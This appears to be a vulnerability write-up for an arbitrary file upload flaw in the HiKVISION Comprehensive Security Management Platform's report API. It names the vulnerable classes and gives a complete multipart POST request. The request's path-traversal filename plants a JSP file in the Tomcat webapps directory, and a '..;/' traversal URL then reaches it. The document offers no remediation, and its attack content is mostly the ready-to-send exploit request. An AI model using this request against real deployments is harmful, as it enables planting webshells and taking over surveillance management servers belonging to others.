# HiKVISION Comprehensive Security Management Platform report Any file upload vulnerability

## Vulnerability Description

There is a vulnerability to upload any file on the report interface of the HiKVISION comprehensive security management platform. The attacker can upload any file by constructing a special request package and obtain server permissions.

## Vulnerability Impact

HiKVISION Comprehensive Security Management Platform

## Network surveying and mapping





## Vulnerability reappears

Login page

![img](https://raw.githubusercontent.com/PeiQi0/PeiQi-WIKI-Book/refs/heads/main/docs/.vuepress/../.vuepress/public/img/1681661275768-9965dbd4-176f-48bc-b55a-062dbe7c5317-20230809120725683.png)

```plain
WEB-INF/classes/com/hikvision/svm/controller/ExternalController.class
```

![img](https://raw.githubusercontent.com/PeiQi0/PeiQi-WIKI-Book/refs/heads/main/docs/.vuepress/../.vuepress/public/img/1681709277423-114b364b-2e5a-4fb0-a7b9-26154f61ca9e.png)

```plain
WEB-INF/classes/com/hikvision/svm/business/serivce/impl/ExternalBusinessServiceImpl.class
```

![img](https://raw.githubusercontent.com/PeiQi0/PeiQi-WIKI-Book/refs/heads/main/docs/.vuepress/../.vuepress/public/img/1681709313430-8f4e019f-f3b7-41fc-a86b-ba1c07e59d45.png)Construct Please upload the file (get the absolute path through env leak, the path will generally not be modified)















```sql
POST /svm/api/external/report HTTP/1.1
Host: 
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary9PggsiM755PLa54a

------WebKitFormBoundary9PggsiM755PLa54a
Content-Disposition: form-data; name="file"; filename="../../../../../../../../../../../opt/hikvision/web/components/tomcat85linux64.1/webapps/eportal/new.jsp"
Content-Type: application/zip

<%out.print("test");%>

------WebKitFormBoundary9PggsiM755PLa54a--
```

![img](https://raw.githubusercontent.com/PeiQi0/PeiQi-WIKI-Book/refs/heads/main/docs/.vuepress/../.vuepress/public/img/1681709342417-a815332d-13c9-40e4-844a-42eb54661897.png)

```plain
/portal/ui/login/..;/..;/new.jsp
```

![img](https://raw.githubusercontent.com/PeiQi0/PeiQi-WIKI-Book/refs/heads/main/docs/.vuepress/../.vuepress/public/img/1681709424146-cb0ef1b8-4732-4c3a-a041-37bad6125d44.png)
